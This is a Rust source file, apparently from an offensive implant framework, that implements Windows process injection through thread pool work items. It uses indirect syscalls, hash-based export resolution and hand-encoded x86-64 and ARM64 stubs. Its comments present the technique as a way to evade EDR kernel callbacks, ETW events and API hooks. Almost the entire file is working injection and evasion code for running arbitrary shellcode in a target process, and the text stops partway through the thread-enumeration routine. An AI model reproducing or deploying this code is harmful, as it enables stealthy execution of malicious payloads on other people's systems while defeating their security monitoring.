//! Thread pool injection via `TpAllocWork` / `TpPostWork`.
//!
//! # Why Thread Pool Injection?
//!
//! Traditional process injection via `NtCreateThreadEx` creates a new remote
//! thread — one of the most heavily monitored events by EDR solutions. Thread
//! creation in a remote process generates callbacks to:
//!
//! - `PsSetCreateThreadNotifyRoutine` (kernel callbacks)
//! - ETW `THREAD` events from the kernel provider
//! - User-mode hooking of `NtCreateThreadEx` / `CreateRemoteThread`
//!
//! Thread pool injection avoids all of these by **recycling an existing worker
//! thread** inside the target process. The Windows thread pool maintains a pool
//! of worker threads waiting on an I/O completion port (IOCP). By posting a
//! work item via `TpPostWork`, one of these threads dequeues and executes the
//! callback. No new thread is created, no thread-creation callbacks fire, and
//! the call stack appears to originate from `ntdll!TppWorkerThread` — a
//! legitimate system function.
//!
//! # OPSEC Properties
//!
//! - **No NtCreateThreadEx** — no remote thread creation event
//! - **No SuspendThread/ResumeThread** — no thread state manipulation
//! - **Authentic call stack** — callback runs from `TppWorkerThread` → work callback
//! - **No new thread TEB** — no new thread environment block allocation
//! - **Undocumented APIs** — `TpAllocWork` / `TpPostWork` are internal ntdll
//!   exports not in the public Windows SDK, reducing likelihood of EDR hooks
//!
//! # Injection Flow
//!
//! 1. Open target process via `NtOpenProcess` (indirect syscall)
//! 2. Allocate RW memory via `NtAllocateVirtualMemory` (indirect syscall)
//! 3. Write shellcode via `NtWriteVirtualMemory` (indirect syscall)
//! 4. Flip protection to RX via `NtProtectVirtualMemory` (indirect syscall)
//! 5. Resolve `TpAllocWork` / `TpPostWork` / `TpReleaseWork` from ntdll
//!    via `pe_resolve` hash-based export resolution (no IAT entries)
//! 6. Build a position-independent stub that:
//!    a. Calls `TpAllocWork(&work, shellcode_addr, NULL, NULL)`
//!    b. Calls `TpPostWork(work)`
//!    c. Calls `TpReleaseWork(work)`
//!    d. Returns
//! 7. Write stub into target process (RW → RX)
//! 8. Execute stub by queueing a user-mode APC to an alertable thread
//!    (NtQueueApcThread via indirect syscall — still no NtCreateThreadEx)
//! 9. The APC fires on the alertable thread, which runs the stub, which
//!    posts the work item. A thread pool worker thread then executes the
//!    shellcode.
//!
//! # Fallback
//!
//! If no alertable thread is found in the target (required for APC delivery),
//! this technique falls back to `NtCreateThreadEx` for stub execution only.
//! The shellcode itself still runs on a thread pool worker thread via
//! TpAllocWork/TpPostWork, so the actual payload execution remains stealthy.

use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct ThreadPoolInjector;

// ── Windows x86_64 implementation ────────────────────────────────────────────

#[cfg(all(windows, target_arch = "x86_64"))]
impl Injector for ThreadPoolInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // Thread pool injection requires raw shellcode (position-independent).
        // PE payloads should use Hollowing or ManualMap instead.
        if payload_has_valid_pe_headers(payload) {
            return Err(anyhow!(
                "ThreadPool injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ManualMap for PE payloads."
            ));
        }

        unsafe { inject_via_thread_pool(pid, payload) }
    }
}

#[cfg(all(windows, target_arch = "aarch64"))]
impl Injector for ThreadPoolInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        if payload_has_valid_pe_headers(payload) {
            return Err(anyhow!(
                "ThreadPool injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ManualMap for PE payloads."
            ));
        }
        unsafe { inject_via_thread_pool_arm64(pid, payload) }
    }
}

// ── Windows ARM64 thread pool injection ──────────────────────────────────────

/// Perform thread pool injection on Windows ARM64 targets.
///
/// Mirrors the x86_64 implementation exactly — same Windows NT API call
/// sequence — but emits an AArch64 machine-code stub in place of the
/// x86-64 one.  The AArch64 stub:
///
/// ```asm
/// stp  x29, x30, [sp, #-32]!   ; save fp/lr, reserve local slot at [sp+16]
/// mov  x29, sp
/// add  x0, sp, #16             ; &local_work (out-param for TpAllocWork)
/// <movz/movk x1, shellcode_base>  ; TP_WORK_CALLBACK = shellcode
/// movz x2, #0                  ; Context  = NULL
/// movz x3, #0                  ; Cleanup  = NULL
/// <movz/movk x9, tp_alloc_work>
/// blr  x9                      ; TpAllocWork(&work, cb, NULL, NULL)
/// ldr  x0, [sp, #16]           ; work handle
/// <movz/movk x9, tp_post_work>
/// blr  x9                      ; TpPostWork(work)
/// ldr  x0, [sp, #16]
/// <movz/movk x9, tp_release_work>
/// blr  x9                      ; TpReleaseWork(work)
/// ldp  x29, x30, [sp], #32     ; restore fp/lr
/// ret
/// ```
#[cfg(all(windows, target_arch = "aarch64"))]
unsafe fn inject_via_thread_pool_arm64(pid: u32, shellcode: &[u8]) -> Result<()> {
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    // ── Step 1: Open target process ──────────────────────────────────────
    let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;

    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let open_status = crate::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask as u64,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );
    match open_status {
        Ok(s) if s >= 0 && h_proc != 0 => {}
        _ => return Err(anyhow!("ThreadPool/ARM64: NtOpenProcess({}) failed", pid)),
    }
    let h_proc = h_proc as *mut std::ffi::c_void;

    macro_rules! close_h {
        ($h:expr) => {
            crate::syscall!("NtClose", $h as u64).ok();
        };
    }
    macro_rules! cleanup_and_err {
        ($msg:expr) => {{
            close_h!(h_proc);
            return Err(anyhow!($msg));
        }};
        ($fmt:expr, $($arg:tt)*) => {{
            close_h!(h_proc);
            return Err(anyhow!($fmt, $($arg)*));
        }};
    }

    // ── Step 2: Allocate RW memory for shellcode ─────────────────────────
    let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut alloc_size = shellcode.len();
    let s = crate::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_mem as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool/ARM64: NtAllocateVirtualMemory failed"),
    }
    if remote_mem.is_null() {
        cleanup_and_err!("ThreadPool/ARM64: NtAllocateVirtualMemory returned null");
    }
    let remote_base = remote_mem as usize;

    // ── Step 3: Write shellcode ──────────────────────────────────────────
    let mut written = 0usize;
    let s = crate::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_mem as u64,
        shellcode.as_ptr() as u64,
        shellcode.len() as u64,
        &mut written as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool/ARM64: NtWriteVirtualMemory failed"),
    }
    if written != shellcode.len() {
        cleanup_and_err!(
            "ThreadPool/ARM64: NtWriteVirtualMemory wrote {} of {} bytes",
            written,
            shellcode.len()
        );
    }

    // ── Step 4: Flip shellcode to RX ─────────────────────────────────────
    let mut old_prot = 0u32;
    let mut prot_base = remote_mem as usize;
    let mut prot_size = shellcode.len();
    let s = crate::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool/ARM64: NtProtectVirtualMemory to RX failed"),
    }
    crate::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_mem as u64,
        shellcode.len() as u64,
    )
    .ok();

    // ── Step 5: Resolve thread pool APIs ─────────────────────────────────
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("ThreadPool/ARM64: ntdll not found"))?;

    let tp_alloc_work = find_tp_alloc_work(ntdll_base)
        .ok_or_else(|| anyhow!("ThreadPool/ARM64: TpAllocWork not found in ntdll"))?;
    let tp_post_work = find_tp_post_work(ntdll_base)
        .ok_or_else(|| anyhow!("ThreadPool/ARM64: TpPostWork not found in ntdll"))?;
    let tp_release_work = find_tp_release_work(ntdll_base)
        .ok_or_else(|| anyhow!("ThreadPool/ARM64: TpReleaseWork not found in ntdll"))?;

    // ── Step 6: Build the AArch64 TpAllocWork/TpPostWork stub ────────────
    //
    // Stack layout (after `stp x29, x30, [sp, #-32]!`):
    //   [sp+ 0] = saved x29 (frame pointer)
    //   [sp+ 8] = saved x30 (link register)
    //   [sp+16] = TP_WORK* output slot
    //   [sp+24] = padding
    let mut stub: Vec<u8> = Vec::with_capacity(192);

    // stp x29, x30, [sp, #-32]!   — FD 7B BE A9
    stub.extend_from_slice(&[0xFD, 0x7B, 0xBE, 0xA9]);
    // mov x29, sp  (ADD x29, sp, #0)  — FD 03 00 91
    stub.extend_from_slice(&[0xFD, 0x03, 0x00, 0x91]);

    // TpAllocWork(&local_work, shellcode_addr, NULL, NULL)
    // x0 = &local_work = sp+16  →  ADD x0, sp, #16
    // 0x91000000 | (16<<10) | (31<<5) | 0 = 0x910043E0
    stub.extend_from_slice(&0x910043E0u32.to_le_bytes());
    // x1 = shellcode_base (TP_WORK_CALLBACK)
    arm64_load64(&mut stub, 1, remote_base as u64);
    // x2 = 0 (Context)   — MOVZ x2, #0  = 0xD2800002
    stub.extend_from_slice(&0xD2800002u32.to_le_bytes());
    // x3 = 0 (Cleanup)   — MOVZ x3, #0  = 0xD2800003
    stub.extend_from_slice(&0xD2800003u32.to_le_bytes());
    // x9 = tp_alloc_work
    arm64_load64(&mut stub, 9, tp_alloc_work as u64);
    // blr x9  — D6 3F 01 20 (LE: 20 01 3F D6)
    stub.extend_from_slice(&0xD63F0120u32.to_le_bytes());

    // TpPostWork(local_work)
    // x0 = [sp+16]  →  LDR x0, [sp, #16]  = 0xF94007E0
    stub.extend_from_slice(&0xF94007E0u32.to_le_bytes());
    // x9 = tp_post_work
    arm64_load64(&mut stub, 9, tp_post_work as u64);
    // blr x9
    stub.extend_from_slice(&0xD63F0120u32.to_le_bytes());

    // TpReleaseWork(local_work)
    // x0 = [sp+16]
    stub.extend_from_slice(&0xF94007E0u32.to_le_bytes());
    // x9 = tp_release_work
    arm64_load64(&mut stub, 9, tp_release_work as u64);
    // blr x9
    stub.extend_from_slice(&0xD63F0120u32.to_le_bytes());

    // Epilogue: ldp x29, x30, [sp], #32  — FD 7B C2 A8
    stub.extend_from_slice(&[0xFD, 0x7B, 0xC2, 0xA8]);
    // ret  — C0 03 5F D6
    stub.extend_from_slice(&0xD65F03C0u32.to_le_bytes());

    // ── Step 7: Write stub into target process ───────────────────────────
    let mut stub_remote: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut stub_size = stub.len();
    let s = crate::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut stub_remote as *mut _ as u64,
        0u64,
        &mut stub_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool/ARM64: stub NtAllocateVirtualMemory failed"),
    }
    if stub_remote.is_null() {
        cleanup_and_err!("ThreadPool/ARM64: stub allocation returned null");
    }

    let mut written = 0usize;
    let s = crate::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        stub_remote as u64,
        stub.as_ptr() as u64,
        stub.len() as u64,
        &mut written as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool/ARM64: stub NtWriteVirtualMemory failed"),
    }
    if written != stub.len() {
        cleanup_and_err!(
            "ThreadPool/ARM64: stub wrote {} of {} bytes",
            written,
            stub.len()
        );
    }

    // Flip stub to RX.
    let mut old_prot = 0u32;
    let mut prot_base = stub_remote as usize;
    let mut prot_size = stub.len();
    let s = crate::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool/ARM64: stub NtProtectVirtualMemory to RX failed"),
    }
    crate::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        stub_remote as u64,
        stub.len() as u64,
    )
    .ok();

    // ── Step 8: Execute stub via APC on an alertable thread ──────────────
    let apc_ok = try_execute_via_apc(h_proc, pid, stub_remote as usize);
    if !apc_ok {
        log::warn!(
            "ThreadPool/ARM64: no alertable thread in pid {}, using NtCreateThreadEx for stub",
            pid
        );
        execute_stub_via_thread(h_proc, stub_remote)?;
    }

    close_h!(h_proc);
    Ok(())
}

#[cfg(not(windows))]
impl Injector for ThreadPoolInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("ThreadPool injection only supported on Windows"))
    }
}

// ── Hash constants for undocumented ntdll exports ────────────────────────────
//
// These are resolved at runtime via pe_resolve::hash_str() and
// pe_resolve::get_proc_address_by_hash(). The hash algorithm is DJB2
// (case-insensitive), so the null-terminated strings must match the exact
// export names in ntdll.dll.

/// Resolve TpAllocWork from ntdll via hash-based export resolution.
///
/// `TpAllocWork` is an undocumented ntdll export that allocates a `TP_WORK`
/// structure. Its prototype (reverse-engineered) is:
///
/// ```c
/// NTSTATUS TpAllocWork(
///     PTP_WORK* WorkReturn,       // [out] receives the work item handle
///     PTP_WORK_CALLBACK Callback, // [in]  function to call on worker thread
///     PVOID Context,              // [in]  passed as Context to callback
///     PCALLBACK_ENVENTRY Cleanup  // [in]  optional cleanup callback (NULL)
/// );
/// ```
#[cfg(windows)]
fn find_tp_alloc_work(ntdll_base: usize) -> Option<usize> {
    let hash = pe_resolve::hash_str(b"TpAllocWork\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
}

/// Resolve TpPostWork from ntdll via hash-based export resolution.
///
/// `TpPostWork` queues a previously allocated work item for execution by
/// the thread pool. Its prototype is:
///
/// ```c
/// VOID TpPostWork(PTP_WORK Work);
/// ```
#[cfg(windows)]
fn find_tp_post_work(ntdll_base: usize) -> Option<usize> {
    let hash = pe_resolve::hash_str(b"TpPostWork\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
}

/// Resolve TpReleaseWork from ntdll via hash-based export resolution.
///
/// `TpReleaseWork` releases a previously allocated work item. Its prototype:
///
/// ```c
/// VOID TpReleaseWork(PTP_WORK Work);
/// ```
#[cfg(windows)]
fn find_tp_release_work(ntdll_base: usize) -> Option<usize> {
    let hash = pe_resolve::hash_str(b"TpReleaseWork\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
}

/// Emit MOVZ + MOVK instructions to load a 64-bit constant into an AArch64
/// register.  Always emits MOVZ for the lowest 16 bits (chunk 0); MOVK is
/// emitted for each higher chunk only when non-zero.
///
/// This function is architecture-independent and used by the ARM64 stub
/// builder at compile time to lay down immediate-load sequences.
fn arm64_load64(stub: &mut Vec<u8>, reg: u8, val: u64) {
    // Base encodings for MOVZ / MOVK (64-bit, shift variant selected by hw):
    //   MOVZ: hw=0→0xD2800000, hw=1→0xD2A00000, hw=2→0xD2C00000, hw=3→0xD2E00000
    //   MOVK: hw=0→0xF2800000, hw=1→0xF2A00000, hw=2→0xF2C00000, hw=3→0xF2E00000
    let movz_bases: [u32; 4] = [0xD2800000, 0xD2A00000, 0xD2C00000, 0xD2E00000];
    let movk_bases: [u32; 4] = [0xF2800000, 0xF2A00000, 0xF2C00000, 0xF2E00000];
    let chunks: [u32; 4] = [
        (val & 0xFFFF) as u32,
        ((val >> 16) & 0xFFFF) as u32,
        ((val >> 32) & 0xFFFF) as u32,
        ((val >> 48) & 0xFFFF) as u32,
    ];
    // Always emit MOVZ for the lowest chunk (even if zero) to guarantee the
    // register is fully initialised from a known state.
    let enc = movz_bases[0] | (chunks[0] << 5) | reg as u32;
    stub.extend_from_slice(&enc.to_le_bytes());
    for hw in 1..4usize {
        if chunks[hw] != 0 {
            let enc = movk_bases[hw] | (chunks[hw] << 5) | reg as u32;
            stub.extend_from_slice(&enc.to_le_bytes());
        }
    }
}

// ── Core injection implementation ────────────────────────────────────────────

/// Perform thread pool injection into the target process.
///
/// This is the core implementation for Windows x86_64 targets. It:
/// 1. Opens the target process
/// 2. Allocates RW memory for the shellcode
/// 3. Writes the shellcode
/// 4. Flips to RX protection
/// 5. Resolves TpAllocWork/TpPostWork/TpReleaseWork from ntdll
/// 6. Builds and writes a stub that calls the thread pool APIs
/// 7. Executes the stub via APC (or falls back to a minimal thread)
///
/// # Safety
///
/// This function performs raw memory manipulation and syscall dispatch.
/// It must only be called with valid PIDs and well-formed shellcode.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    // ── Step 1: Open target process ──────────────────────────────────────
    let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;

    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let open_status = crate::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask as u64,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );
    match open_status {
        Ok(s) if s >= 0 && h_proc != 0 => {}
        _ => return Err(anyhow!("ThreadPool: NtOpenProcess({}) failed", pid)),
    }
    let h_proc = h_proc as *mut std::ffi::c_void;

    macro_rules! close_h {
        ($h:expr) => {
            crate::syscall!("NtClose", $h as u64).ok();
        };
    }
    macro_rules! cleanup_and_err {
        ($msg:expr) => {{
            close_h!(h_proc);
            return Err(anyhow!($msg));
        }};
        ($fmt:expr, $($arg:tt)*) => {{
            close_h!(h_proc);
            return Err(anyhow!($fmt, $($arg)*));
        }};
    }

    // ── Step 2: Allocate RW memory for shellcode ─────────────────────────
    let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut alloc_size = shellcode.len();
    let s = crate::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_mem as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool: NtAllocateVirtualMemory failed"),
    }
    if remote_mem.is_null() {
        cleanup_and_err!("ThreadPool: NtAllocateVirtualMemory returned null");
    }
    let remote_base = remote_mem as usize;

    // ── Step 3: Write shellcode ──────────────────────────────────────────
    let mut written = 0usize;
    let s = crate::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_mem as u64,
        shellcode.as_ptr() as u64,
        shellcode.len() as u64,
        &mut written as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool: NtWriteVirtualMemory failed"),
    }
    if written != shellcode.len() {
        cleanup_and_err!(
            "ThreadPool: NtWriteVirtualMemory wrote {} of {} bytes",
            written,
            shellcode.len()
        );
    }

    // ── Step 4: Flip to RX ───────────────────────────────────────────────
    let mut old_prot = 0u32;
    let mut prot_base = remote_mem as usize;
    let mut prot_size = shellcode.len();
    let s = crate::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool: NtProtectVirtualMemory to RX failed"),
    }

    // Flush I-cache.
    crate::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_mem as u64,
        shellcode.len() as u64,
    )
    .ok();

    // ── Step 5: Resolve thread pool APIs ─────────────────────────────────
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("ThreadPool: ntdll not found"))?;

    let tp_alloc_work = find_tp_alloc_work(ntdll_base)
        .ok_or_else(|| anyhow!("ThreadPool: TpAllocWork not found in ntdll"))?;
    let tp_post_work = find_tp_post_work(ntdll_base)
        .ok_or_else(|| anyhow!("ThreadPool: TpPostWork not found in ntdll"))?;
    let tp_release_work = find_tp_release_work(ntdll_base)
        .ok_or_else(|| anyhow!("ThreadPool: TpReleaseWork not found in ntdll"))?;

    // ── Step 6: Build the TpAllocWork/TpPostWork stub ────────────────────
    //
    // The stub executes in the target process and performs:
    //   TpAllocWork(&local_work, shellcode_addr, NULL, NULL)
    //   TpPostWork(local_work)
    //   TpReleaseWork(local_work)
    //   ret
    //
    // Layout (x86-64, Windows ABI):
    //   [rsp+0x30] = local_work (8 bytes for PTP_WORK pointer)
    //   Shadow space = [rsp+0x00..0x20]
    //   Alignment padding + local_work = [rsp+0x20..0x38]
    //
    // The TP_WORK_CALLBACK prototype is:
    //   VOID CALLBACK WorkCallback(
    //       PTP_CALLBACK_INSTANCE Instance,  → rcx (ignored by shellcode)
    //       PVOID Context,                    → rdx (NULL in our case)
    //       PTP_WORK Work                     → r8  (ignored by shellcode)
    //   );
    //
    // Since TpAllocWork sets the callback to our shellcode address, the
    // worker thread calls shellcode(Instance=NULL-ish, Context=NULL, Work=work_handle).
    // Position-independent shellcode ignores these parameters.

    let mut stub: Vec<u8> = Vec::with_capacity(128);

    // sub rsp, 0x38  (shadow 0x20 + 8 alignment + 0x10 for local_work)
    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

    // lea rcx, [rsp+0x30]  ; &local_work (1st arg: PTP_WORK*)
    stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);

    // movabs rdx, <shellcode_base>  (2nd arg: callback = shellcode addr)
    stub.push(0x48);
    stub.push(0xBA);
    stub.extend_from_slice(&(remote_base as u64).to_le_bytes());

    // xor r8d, r8d  (3rd arg: Context = NULL)
    stub.extend_from_slice(&[0x45, 0x31, 0xC0]);

    // xor r9d, r9d  (4th arg: Cleanup callback = NULL)
    stub.extend_from_slice(&[0x45, 0x31, 0xC9]);

    // movabs rax, <tp_alloc_work>
    stub.push(0x48);
    stub.push(0xB8);
    stub.extend_from_slice(&(tp_alloc_work as u64).to_le_bytes());
    // call rax
    stub.extend_from_slice(&[0xFF, 0xD0]);

    // Load local_work handle from [rsp+0x30]
    // mov rcx, [rsp+0x30]  ; 1st arg to TpPostWork
    stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

    // movabs rax, <tp_post_work>
    stub.push(0x48);
    stub.push(0xB8);
    stub.extend_from_slice(&(tp_post_work as u64).to_le_bytes());
    // call rax
    stub.extend_from_slice(&[0xFF, 0xD0]);

    // Load local_work handle again for release
    // mov rcx, [rsp+0x30]
    stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

    // movabs rax, <tp_release_work>
    stub.push(0x48);
    stub.push(0xB8);
    stub.extend_from_slice(&(tp_release_work as u64).to_le_bytes());
    // call rax
    stub.extend_from_slice(&[0xFF, 0xD0]);

    // add rsp, 0x38
    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
    // ret
    stub.push(0xC3);

    // ── Step 7: Write stub into target process ───────────────────────────
    let mut stub_remote: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut stub_size = stub.len();
    let s = crate::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut stub_remote as *mut _ as u64,
        0u64,
        &mut stub_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool: stub NtAllocateVirtualMemory failed"),
    }
    if stub_remote.is_null() {
        cleanup_and_err!("ThreadPool: stub allocation returned null");
    }

    let mut written = 0usize;
    let s = crate::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        stub_remote as u64,
        stub.as_ptr() as u64,
        stub.len() as u64,
        &mut written as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool: stub NtWriteVirtualMemory failed"),
    }
    if written != stub.len() {
        cleanup_and_err!("ThreadPool: stub wrote {} of {} bytes", written, stub.len());
    }

    // Flip stub to RX.
    let mut old_prot = 0u32;
    let mut prot_base = stub_remote as usize;
    let mut prot_size = stub.len();
    let s = crate::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 => {}
        _ => cleanup_and_err!("ThreadPool: stub NtProtectVirtualMemory to RX failed"),
    }

    // Flush I-cache for stub.
    crate::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        stub_remote as u64,
        stub.len() as u64,
    )
    .ok();

    // ── Step 8: Execute stub via APC on an alertable thread ──────────────
    //
    // Try to find an alertable thread in the target process and queue the
    // stub as a user-mode APC. If no alertable thread is found, fall back
    // to creating a thread for the stub (the shellcode itself still executes
    // on a thread pool worker thread, preserving the main OPSEC benefit).

    let apc_ok = try_execute_via_apc(h_proc, pid, stub_remote as usize);
    if !apc_ok {
        log::warn!(
            "ThreadPool: no alertable thread found in pid {}, falling back to NtCreateThreadEx for stub execution",
            pid
        );
        // Fallback: create a thread to execute the stub.
        // The stub itself calls TpAllocWork/TpPostWork, so the actual payload
        // still runs on a thread pool worker. This fallback only creates a
        // transient thread for the stub, which is short-lived and less
        // suspicious than a thread running arbitrary shellcode directly.
        execute_stub_via_thread(h_proc, stub_remote)?;
    }

    // Close process handle (fire-and-forget injection).
    close_h!(h_proc);
    Ok(())
}

/// Attempt to execute the stub by queuing a user-mode APC to an alertable
/// thread in the target process.
///
/// Returns `true` if the APC was queued successfully, `false` otherwise.
#[cfg(windows)]
unsafe fn try_execute_via_apc(h_proc: *mut std::ffi::c_void, pid: u32, stub_addr: usize) -> bool {
    use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, THREAD_SET_CONTEXT};

    // Take a snapshot of all threads in the target process.
    let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
    let k32_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
        Some(b) => b,
        None => return false,
    };
    let snap_fn: Option<unsafe extern "system" fn(u32, u32) -> *mut std::ffi::c_void> =
        pe_resolve::get_proc_address_by_hash(k32_base, snap_hash).map(|a| std::mem::transmute(a));
    let snap_fn = match snap_fn {
        Some(f) => f,
        None => return false,
    };

    // TH32CS_SNAPTHREAD = 0x00000004
    let snap = snap_fn(0x00000004, 0);
    if snap.is_null() {
        return false;
    }

    // Thread32First / Thread32Next
    let t32f_hash = pe_resolve::hash_str(b"Thread32First\0");
    let t32n_hash = pe_resolve::hash_str(b"Thread32Next\0");
    let close_hash = pe_resolve::hash_str(b"CloseHandle\0");

    let t32f_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut u8) -> i32> =
        pe_resolve::get_proc_address_by_hash(k32_base, t32f_hash).map(|a| std::mem::transmute(a));
    let t32n_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut u8) -> i32> =
        pe_resolve::get_proc_address_by_hash(k32_base, t32n_hash).map(|a| std::mem::transmute(a));
    let close_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> i32> =
        pe_resolve::get_proc_address_by_hash(k32_base, close_hash).map(|a| std::mem::transmute(a));

    let (t32f_fn, t32n_fn, close_fn) = match (t32f_fn, t32n_fn, close_fn) {
        (Some(f), Some(n), Some(c)) => (f, n, c),
        _ => {
            // Can't enumerate threads — close snapshot and bail.
            let _ = crate::syscall!("NtClose", snap as u64);
            return false;
        }
    };

    // THREADENTRY32 layout (first 2 fields):
    //   dwSize : DWORD (offset 0, 4 bytes)
    //   cntUsage : DWORD (offset 4, 4 bytes)
    //   th32ThreadID : DWORD (offset 8, 4 bytes)
    //   th32OwnerProcessID : DWORD (offset 12, 4 bytes)
    // Total size we care about: 16 bytes, but struct is 28 bytes on x64.
    const TE_SIZE: usize = 28;
    let mut te_buf = [0u8; TE_SIZE];
    // Set dwSize
    let size_bytes = (TE_SIZE as u32).to_le_bytes();
    te_buf[0..4].copy_from_slice(&size_bytes);

    let mut found = false;

    if t32f_fn(snap, te_buf.as_mut_ptr()) != 0 {
        loop {
            // Parse th32OwnerProcessID (offset 12) and th32ThreadID (offset 8)
            let te_pid = u32::from_le_bytes([te_buf[12], te_buf[13], te_buf[14], te_buf[15]]);
